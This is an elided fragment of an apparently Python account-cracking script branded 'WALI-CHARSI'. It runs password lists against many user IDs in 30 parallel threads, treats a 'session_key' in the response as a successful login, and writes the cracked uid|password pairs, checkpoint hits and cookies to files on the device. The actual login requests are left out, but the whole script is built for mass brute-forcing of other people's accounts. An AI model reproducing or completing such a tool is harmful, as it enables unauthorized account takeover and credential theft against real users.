...
try:
	...
	os.system('python WALI-CHARSI.py')
os.system("clear")
...
folder_path = '/sdcard/WALI-CHARSI'
try:
...
def file_crack():
	...
	with tred(max_workers=30) as WALI-CHARSI:
		clear()
		tl = str(len(fo))
		...
		for user in fo:
			...
			passlist = plist
			if methd =='1':
				WALI-CHARSI.submit(api1,ids,names,passlist)
			else:
				WALI-CHARSI.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as WALI-CHARSI:
		...
		for psx in user:
			...
			WALI-CHARSI.submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ WALI-CHARSI ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						file_path_ok = os.path.join(folder_path, 'WALI-CHARSI_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'WALI-CHARSI_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [SIALXD-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'WALI-CHARSI-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ WALI-CHARSI-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [SIALXD-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'WALI-CHARSI_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
